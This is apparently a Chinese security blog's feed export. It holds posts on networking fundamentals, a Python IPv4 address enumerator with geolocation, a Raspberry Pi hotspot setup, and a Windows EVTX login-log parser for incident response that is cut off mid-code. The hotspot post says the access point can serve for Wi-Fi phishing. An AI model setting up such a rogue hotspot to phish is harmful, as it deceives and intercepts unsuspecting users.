        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><h2 id="1、什么是网络"><a href="#1、什么是网络" class="headerlink" title="1、什么是网络"></a>1、什么是网络</h2><pre><code> 两个终端，用一条能承载数据传输的物理介质（传输介质）连接起来，就组成了一个最简单的网络。</code></pre><h2 id="2、OSI七层参考模型"><a href="#2、OSI七层参考模型" class="headerlink" title="2、OSI七层参考模型"></a>2、OSI七层参考模型</h2><pre><code>网线-物理层: 在设备之间传输比特流，规定了电平、速度和电缆针脚。交换机-数据链路层：将比特组合成字节，再将字节组合成帧，使用链路层地址（以太网使用MAC地址）来访问介质，并进行差错检测。路由器-网络层：提供逻辑地址，供路由器确定路径。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的数据能被另一个系统的应用层识别。应用软件- 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。</code></pre><h2 id="3、TCP-IP模型"><a href="#3、TCP-IP模型" class="headerlink" title="3、TCP/IP模型"></a>3、TCP/IP模型</h2><pre><code>应用层通过各种协议向终端用户提供业务应用---数据   提供应该程序网络接口传输层保证源端到目的端之间的可靠传输-----端口号+数据   建立端到端连接网络层解决网络之间的逻辑转发问题-------ip地址+端口号+数据  寻址和路由选择ip网络接口层---------------------------物理地址+ip地址+端口号+数据 物理介质访问 二进制数据流传输</code></pre><h2 id="4、三次握手-建立TCP连接的过程"><a href="#4、三次握手-建立TCP连接的过程" class="headerlink" title="4、三次握手-建立TCP连接的过程"></a>4、三次握手-建立TCP连接的过程</h2><pre><code>三次握手指建立一个TCP连接时，需要客户端和服务器总共发送三个包。进行三次握手的主要作用是为了确定双方的接受能力和发送能力是否正常、指定自己的初始化序列为后面的可靠性传输做准备。实质上就是连接服务器指定端口，建立TCP连接，并同步连接双方的序列号和确认号，交换TCP窗口大小信号。</code></pre><p>刚开始客户端处于 Closed 的状态，服务端处于 Listen 状态。<br> 进行三次握手</p><pre><code>第一次握手：客户端向服务器发送SYN报文，并指明客户端的初始化序列号 ISN©。此时客户端处于 SYN_SEND 状态。           首部的同步位SYN=1，初始序号seq=x，SYN=1的报文段不能携带数据，但要消耗掉一个序号。第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，            并且也是指定了自己的初始化序列号 ISN(s)。同时会把客户端的 ISN + 1 作为ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD 的状态。第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，            当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，            此时客户端处于 ESTABLISHED 状态。服务器收到 ACK 报文之后，也处于 ESTABLISHED 状态，此时，双方已建立起了连接。            确认报文段ACK=1，确认号ack=y+1，序号seq=x+1（初始为seq=x，第二个报文段所以要+1），ACK报文段可以携带数据，不携带数据则不消耗序号。</code></pre><h2 id="5、四次挥手-断开TCP连接的过程"><a href="#5、四次挥手-断开TCP连接的过程" class="headerlink" title="5、四次挥手-断开TCP连接的过程"></a>5、四次挥手-断开TCP连接的过程</h2><pre><code>建立一个连接需要三次握手，而终止一个连接要经过四次挥手（也有将四次挥手叫做四次握手的）。这由TCP的半关闭（half-close）造成的。所谓的半关闭，其实就是TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。</code></pre><p>刚开始双方都处于 ESTABLISHED 状态，假如是客户端先发起关闭请求。<br>进行四次挥手</p><pre><code>第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于 FIN_WAIT1 状态。            即发出连接释放报文段（FIN=1，序号seq=u），并停止再发送数据，主动关闭TCP连接，进入FIN_WAIT1（终止等待1）状态，等待服务端的确认。第二次挥手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 +1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT 状态。            即服务端收到连接释放报文段后即发出确认报文段（ACK=1，确认号ack=u+1，序号seq=v），            服务端进入CLOSE_WAIT（关闭等待）状态，此时的TCP处于半关闭状态，客户端到服务端的连接释放。客户端收到服务端的确认后，进入FIN_WAIT2（终止等待2）状态，等待服务端发出的连接释放报文段。第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。            即服务端没有要向客户端发出的数据，服务端发出连接释放报文段（FIN=1，ACK=1，序号seq=w，确认号ack=u+1），            服务端进入LAST_ACK（最后确认）状态，等待客户端的确认。第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 +1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态，服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。            即客户端收到服务端的连接释放报文段后，对此发出确认报文段（ACK=1，seq=u+1，ack=w+1），客户端进入TIME_WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，客户端才进入CLOSED状态。</code></pre><p>收到一个FIN只意味着在这一方向上没有数据流动。客户端执行主动关闭并进入TIME_WAIT是正常的，服务端通常执行被动关闭，不会进入TIME_WAIT状态。<br>参考链接：<a href="https://zhuanlan.zhihu.com/p/86426969">https://zhuanlan.zhihu.com/p/86426969</a></p><h2 id="6、IPv4"><a href="#6、IPv4" class="headerlink" title="6、IPv4"></a>6、IPv4</h2><pre><code>IP报文头部长度为20到60字节，IPv4地址为32比特的二进制数，通常用点分十进制表示。IP地址包括两部分，第一部分是网络号，表示IP地址所属的网段，第二部分是主机号，用来唯一标识本网段上的某台网络设备。IP地址的主机位为全0，表示一个网段，广播地址的主机位为全1。</code></pre><p>IPv4地址被划分为A、B、C、D、E五类</p><pre><code>A类地址第一字节的最高位固定为0（0.0.0.0~127.255.255.255）B类地址第一字节的高两位固定为10（128.0.0.0~191.255.255.255）C类地址第一字节的高三位固定为110（192.0.0.0~223.255.255.255）D类地址第一字节的高四位固定为1110（224.0.0.0~239.255.255.255）组播E类地址第一字节的高四位固定为1111(240.0.0.0~255.255.255.255)保留</code></pre><p>特殊地址</p><pre><code>私有地址范围10.0.0.0~10.255.255.255 172.16.0.0~172.31.255.255192.168.0.0~192.168.255.255特殊地址127.0.0.0 ~ 127.255.255.255（本机）0.0.0.0255.255.255.255</code></pre><p>子网掩码用于区分网络部分和主机部分。子网掩码中的1表示网络位，0表示主机位。<br>IP报文头中包含一个生存时间TTL（Time To Live）字段，报文每经过一台三层设备，TTL值减1,当报文中的TTL降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端发送ICMP错误消息。</p><h2 id="7、常见协议"><a href="#7、常见协议" class="headerlink" title="7、常见协议"></a>7、常见协议</h2><p>（1）ICMP协议</p><pre><code>  ICMP（Internet控制报文协议）是TCP/IP协议簇的核心协议之一，  它用于在IP网络设备之间发送控制报文，传递差错、控制、查询等信息。</code></pre><p>典型应用：ping  Tracert<br>（2）ARP协议</p><pre><code>  一台网络设备要发送数据给另一台网络设备时，  必须要知道对方的IP地址和MAC地址。MAC地址通过ARP协议来获取。  ARP报文不能穿越路由器，不能被转发到其他广播域。  网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息，则通过发送ARP request报文来获得它。</code></pre><p>（3）HTTP协议</p><pre><code>HTTP(Hyper Text Transfer Protocol)的缩写.是用于从WWW服务器传输超文本到本地浏览器的传输协议.HTTP是一个应用层协议,由请求和响应构成,是一个标准的个客户端和服务器模型.它的主要特点如下:1. 支持客户端/服务器模型2. 简单快速</code></pre><p>（4）FTP协议</p><pre><code>FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。</code></pre><p>（5）Telnet协议</p><pre><code>Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</code></pre><p>（6）SMTP协议</p><pre><code>SMTP是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</code></pre><p>（7）UDP协议</p><pre><code>Internet 协议集支持一个无连接的传输协议，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法。Internet 的传输层有两个主要协议，互为补充。无连接的是 UDP</code></pre><p>（8）TCP协议</p><pre><code>传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议</code></pre><p>（9）IP协议</p><pre><code>主要负责将数据包发送给最终的目标计算机。ip协议是面向无连接的，ip地址是IP协议的基石。DNS负责将域名转换为IP地址，ARP负责根据IP找到MAC地址，RARP功能与ARP相反。DHCP可以自动获取IP地址socket是应用程序实现TCP/UDP的API</code></pre><p>待补充</p><h2 id="8、网络设备"><a href="#8、网络设备" class="headerlink" title="8、网络设备"></a>8、网络设备</h2><pre><code>网卡：计算机连接网络的设备网桥：数据链路层连接两个网络的设备，能够识别数据链路层中的数据帧并将其转换成一个全新的帧发送给另一个网段交换机：可以看做持有多个端口的网桥路由器：作用在网络层，对分组报文进行转发网关：用来转发来自不同网段之间的数据包。防火墙：在不同网络（如可信任的企业内部网和不可信的公共网）或网络安全域之间的一系列部件的组合。        它可以通过监测、限制、更改跨越防火墙的数据流。IPS：即入侵防御系统，有时又称IDP，即入侵检测（IDS）和防御系统，指具备IDS的检测能力，同时部署防御系统、    入侵检测和防御、病毒防御、Dos和DDos防护、url过滤、应用检测VPN：虚拟专用网络;功能是在公用网络上建立专用网络,进行加密通讯。日志审计：集中采集信息系统中的系统安全事件、用户访问记录、系统运行日志、系统运行状态等各类信息，        经过规范化、过滤、归并和告警分析等处理后，以统一格式的日志形式进行集中存储和管理，结合丰富的日志统计汇总及关联分析功能，实现对信息系统日志的全面审计。WAF：即Web应用防火墙或Web应用过防护系统。通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。    功能：XXS（可信任的网页夹带木马）防护、SQL注入、CSRF(w伪造一个可信的网站)防护，防盗链，及robot（爬虫）防护等。ADS：流量清洗设备，防止DDOS攻击。</code></pre><h2 id="9、HTTP状态码"><a href="#9、HTTP状态码" class="headerlink" title="9、HTTP状态码"></a>9、HTTP状态码</h2><pre><code>200("OK")：一切正常。实体主体中的文档（若存在的话）是某资源的表示。400("Bad Request")：客户端方面的问题。实体主题中的文档（若存在的话）是一个错误消息。希望客户端能够理解此错误消息，并改正问题。500("Internal Server Error")：服务期方面的问题。实体主体中的文档（如果存在的话）是一个错误消息。该错误消息通常无济于事，因为客户端无法修复服务器方面的问题。301("Moved Permanently")：当客户端触发的动作引起了资源URI的变化时发送此响应代码。另外，当客户端向一个资源的旧URI发送请求时，也发送此响应代码。404("Not Found") 和410("Gone")：当客户端所请求的URI不对应于任何资源时，发送此响应代码。404用于服务器端不知道客户端要请求哪个资源的情况；410用于服务器端知道客户端所请求的资源曾经存在，但现在已经不存在了的情况。409("Conflict")：当客户端试图执行一个”会导致一个或多个资源处于不一致状态“的操作时，发送此响应代码。</code></pre><p>参考链接：<a href="https://www.cnblogs.com/xflonga/p/9368993.html">https://www.cnblogs.com/xflonga/p/9368993.html</a></p><h2 id="10、待补充。。。"><a href="#10、待补充。。。" class="headerlink" title="10、待补充。。。"></a>10、待补充。。。</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python生成IP地址</title>
      <link href="/2019/12/26/%E4%BD%BF%E7%94%A8python%E7%94%9F%E6%88%90ip%E5%9C%B0%E5%9D%80/"/>
      <url>/2019/12/26/%E4%BD%BF%E7%94%A8python%E7%94%9F%E6%88%90ip%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="IP地址生成"><a href="#IP地址生成" class="headerlink" title="IP地址生成"></a>IP地址生成</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#_*_ coding:utf8 _*_</span><span class="token comment"># Created on 2017/11/25.</span>__author__ <span class="token operator">=</span> <span class="token string">'k3vi'</span><span class="token keyword">from</span> itertools <span class="token keyword">import</span> product<span class="token punctuation">,</span> islice<span class="token keyword">from</span> ip2locate <span class="token keyword">import</span> Ip2Locate<span class="token keyword">class</span> <span class="token class-name">Generate_ip_pool</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fmt <span class="token operator">=</span> <span class="token string">"%s.%s.%s.%s"</span>        self<span class="token punctuation">.</span>start<span class="token operator">=</span><span class="token string">'1.0.0.0'</span>    <span class="token keyword">def</span> <span class="token function">ip_pool</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        p1<span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p3<span class="token punctuation">,</span>p4<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> self<span class="token punctuation">.</span>start<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ip <span class="token operator">=</span> islice<span class="token punctuation">(</span>product<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>ip<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    iplocate <span class="token operator">=</span> Ip2Locate<span class="token punctuation">(</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> Generate_ip_pool<span class="token punctuation">(</span><span class="token punctuation">)</span>    ipPool <span class="token operator">=</span> x<span class="token punctuation">.</span>ip_pool<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">next</span><span class="token punctuation">(</span>ipPool<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        iplocate<span class="token punctuation">.</span>ip <span class="token operator">=</span> ip        <span class="token keyword">print</span><span class="token punctuation">(</span>iplocate<span class="token punctuation">.</span>locate<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派3B创建 wifi 热点</title>
      <link href="/2019/11/14/%E6%A0%91%E8%8E%93%E6%B4%BE3b%E5%88%9B%E5%BB%BA-wifi-%E7%83%AD%E7%82%B9/"/>
      <url>/2019/11/14/%E6%A0%91%E8%8E%93%E6%B4%BE3b%E5%88%9B%E5%BB%BA-wifi-%E7%83%AD%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230165108.png"></p><hr><blockquote><p>为了方便的使用树莓派，有时我们需要通过wifi来操作树莓派，或者利用树莓派来建立钓鱼wifi，这个时候我们就可以使用hostapd来创建一个wifi热点。下面是具体的操作</p></blockquote><h5 id="安装-hostapd、dnsmasq："><a href="#安装-hostapd、dnsmasq：" class="headerlink" title="安装 hostapd、dnsmasq："></a>安装 hostapd、dnsmasq：</h5><p><code>sudo apt-get install hostapd dnsmasq</code></p><h5 id="然后在-etc-dnsmasq-conf末加入"><a href="#然后在-etc-dnsmasq-conf末加入" class="headerlink" title="然后在/etc/dnsmasq.conf末加入"></a>然后在/etc/dnsmasq.conf末加入</h5><p>（自己修改IP和网段，这个文件是已存在的，很详细的配置文件，但是所有行都加入了#号注释掉）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">interface</span><span class="token operator">=</span>wlan0dhcp-range<span class="token operator">=</span><span class="token number">10.0</span>.0.2,10.0.0.5,255.255.255.0,12h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="然后新建-etc-hostapd-hostapd-conf，加入"><a href="#然后新建-etc-hostapd-hostapd-conf，加入" class="headerlink" title="然后新建/etc/hostapd/hostapd.conf，加入"></a>然后新建/etc/hostapd/hostapd.conf，加入</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">interface</span><span class="token operator">=</span>wlan0<span class="token assign-left variable">hw_mode</span><span class="token operator">=</span>g<span class="token assign-left variable">channel</span><span class="token operator">=</span><span class="token number">10</span><span class="token assign-left variable">auth_algs</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">wpa</span><span class="token operator">=</span><span class="token number">2</span><span class="token assign-left variable">wpa_key_mgmt</span><span class="token operator">=</span>WPA-PSK<span class="token assign-left variable">wpa_pairwise</span><span class="token operator">=</span>CCMP<span class="token assign-left variable">rsn_pairwise</span><span class="token operator">=</span>CCMP<span class="token assign-left variable">wpa_passphrase</span><span class="token operator">=</span>wifi密码<span class="token assign-left variable">ssid</span><span class="token operator">=</span>wifi名字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="接着修改-etc-sysctl-conf，开启网卡的转发功能，如果不修改此项，热点将无法上网"><a href="#接着修改-etc-sysctl-conf，开启网卡的转发功能，如果不修改此项，热点将无法上网" class="headerlink" title="接着修改/etc/sysctl.conf，开启网卡的转发功能，如果不修改此项，热点将无法上网"></a>接着修改/etc/sysctl.conf，开启网卡的转发功能，如果不修改此项，<em>热点将无法上网</em></h5><p>更改如下内容（如果有这一行，把#号去掉就行）</p><p><code>net.ipv4.ip_forward=1</code></p><h5 id="最后，将下面脚本加入到-etc-rc-local的exit-0前："><a href="#最后，将下面脚本加入到-etc-rc-local的exit-0前：" class="headerlink" title="最后，将下面脚本加入到/etc/rc.local的exit 0前："></a>最后，将下面脚本加入到/etc/rc.local的exit 0前：</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> wlan0 down<span class="token function">ifconfig</span> wlan0 <span class="token number">10.0</span>.0.1 netmask <span class="token number">255.255</span>.255.0 upiwconfig wlan0 power off<span class="token function">service</span> dnsmasq restarthostapd -B /etc/hostapd/hostapd.conf <span class="token operator">&amp;</span> <span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token function">sudo</span> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<span class="token function">sudo</span> iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT<span class="token function">sudo</span> iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启，就可以看到热点了</p><p>这样的热点可以进行wifi钓鱼，但是配置起来就比较麻烦了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Evtx模块解析Windows日志</title>
      <link href="/2019/11/13/%E4%BD%BF%E7%94%A8evtx%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90windows%E6%97%A5%E5%BF%97/"/>
      <url>/2019/11/13/%E4%BD%BF%E7%94%A8evtx%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90windows%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230164340.png"></p><blockquote><p>平时在做应急响应时需要对Windows日志分析，在进行日志分析时经常遇到Windows日志阅读困难，所以萌生了编写一个解析处理脚本的想法，这里使用了Evtx模块将Windows日志转换成xml，在对通过Windows日志格式对xml进行处理，最终导出csv格式</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>安装模块<code>pip install python-evtx </code></p><h2 id="windows-日志解释"><a href="#windows-日志解释" class="headerlink" title="windows 日志解释"></a>windows 日志解释</h2><h3 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h3><p>EventID 代表Windows的事件ID,而这里的脚本只写了对事件ID为4624和4625的处理。<br>常见有Windows事件ID有</p><table><thead><tr><th align="left">事件ID</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">1102</td><td align="left">清理审计日志</td></tr><tr><td align="left">4624</td><td align="left">账号成功登录</td></tr><tr><td align="left">4625</td><td align="left">账号登录失败</td></tr><tr><td align="left">4768</td><td align="left">Kerberos身份验证（TGT请求）</td></tr><tr><td align="left">4769</td><td align="left">Kerberos服务票证请求</td></tr><tr><td align="left">4776</td><td align="left">NTLM身份验证</td></tr><tr><td align="left">4672</td><td align="left">授予特殊权限</td></tr><tr><td align="left">4720</td><td align="left">创建用户</td></tr><tr><td align="left">4726</td><td align="left">删除用户</td></tr><tr><td align="left">4728</td><td align="left">将成员添加到启用安全的全局组中</td></tr><tr><td align="left">4729</td><td align="left">将成员从安全的全局组中移除</td></tr><tr><td align="left">4732</td><td align="left">将成员添加到启用安全的本地组中</td></tr><tr><td align="left">4733</td><td align="left">将成员从启用安全的本地组中移除</td></tr><tr><td align="left">4756</td><td align="left">将成员添加到启用安全的通用组中</td></tr><tr><td align="left">4757</td><td align="left">将成员从启用安全的通用组中移除</td></tr><tr><td align="left">4719</td><td align="left">系统审计策略修改</td></tr></tbody></table><h3 id="登录类型"><a href="#登录类型" class="headerlink" title="登录类型"></a>登录类型</h3><p>Windows 有10种不同的事件类型，每种类型代表一种</p><table><thead><tr><th align="left">登录类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">交互式登录（用户从控制台登录）</td></tr><tr><td align="left">3</td><td align="left">网络（例如：通过net use,访问共享网络）</td></tr><tr><td align="left">4</td><td align="left">批处理（为批处理程序保留）</td></tr><tr><td align="left">5</td><td align="left">服务启动（服务登录）</td></tr><tr><td align="left">6</td><td align="left">不支持</td></tr><tr><td align="left">7</td><td align="left">解锁（带密码保护的屏幕保护程序的无人值班工作站）</td></tr><tr><td align="left">8</td><td align="left">网络明文（IIS服务器登录验证）</td></tr><tr><td align="left">10</td><td align="left">远程交互（终端服务，远程桌面，远程辅助）</td></tr><tr><td align="left">11</td><td align="left">缓存域证书登录</td></tr></tbody></table><h3 id="功能及后续工作"><a href="#功能及后续工作" class="headerlink" title="功能及后续工作"></a>功能及后续工作</h3><h3 id="目前已有功能"><a href="#目前已有功能" class="headerlink" title="目前已有功能"></a>目前已有功能</h3><ol><li>可以读取evxt文件，并按照格式生成csv</li><li>可以将Windows登录日志过滤出来<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3></li><li>只能在脚本所在目录解析相对路径的日志文件</li><li>目前只对安全日志进行了格式处理<h3 id="后续工作"><a href="#后续工作" class="headerlink" title="后续工作"></a>后续工作</h3></li><li>解析更多的类型</li><li>优化代码<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mmap<span class="token keyword">import</span> contextlib<span class="token keyword">import</span> sys<span class="token keyword">import</span> getopt<span class="token keyword">from</span> Evtx<span class="token punctuation">.</span>Evtx <span class="token keyword">import</span> FileHeader<span class="token keyword">from</span> Evtx<span class="token punctuation">.</span>Views <span class="token keyword">import</span> evtx_file_xml_view<span class="token keyword">from</span> xml<span class="token punctuation">.</span>etree <span class="token keyword">import</span> ElementTreedatalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''目前采用单线程的方式处理日志，结果导出到csv文件中'''</span><span class="token keyword">def</span> <span class="token function">MyFun</span><span class="token punctuation">(</span>EvtxPath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>EvtxPath<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">with</span> contextlib<span class="token punctuation">.</span>closing<span class="token punctuation">(</span>mmap<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span>f<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> access<span class="token operator">=</span>mmap<span class="token punctuation">.</span>ACCESS_READ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> buf<span class="token punctuation">:</span>            fh <span class="token operator">=</span> FileHeader<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> xml<span class="token punctuation">,</span> record <span class="token keyword">in</span> evtx_file_xml_view<span class="token punctuation">(</span>fh<span class="token punctuation">)</span><span class="token punctuation">:</span>                    xml <span class="token operator">=</span> xml<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token triple-quoted-string string">''' xmlns="http://schemas.microsoft.com/win/2004/08/events/event"'''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                    <span class="token comment"># 此处需要将内容替换掉，不然解析会报错</span>                    InterestEvent<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">deal_login</span><span class="token punctuation">(</span>status<span class="token punctuation">,</span> Eroot<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 处理单条日志</span>    time <span class="token operator">=</span> Eroot<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'TimeCreated'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>attrib<span class="token punctuation">[</span><span class="token string">'SystemTime'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取记录日志的时间</span>    time <span class="token operator">=</span> time<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    Datas <span class="token operator">=</span> Eroot<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'EventData'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'Data'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> Datas<span class="token punctuation">:</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'IpAddress'</span><span class="token punctuation">:</span>  <span class="token comment"># 获取IP值</span>            <span class="token keyword">if</span> data<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>  <span class="token comment"># 过滤IP值为 - 的记录</span>                <span class="token keyword">return</span>            <span class="token comment"># if data.text == '127.0.0.1': 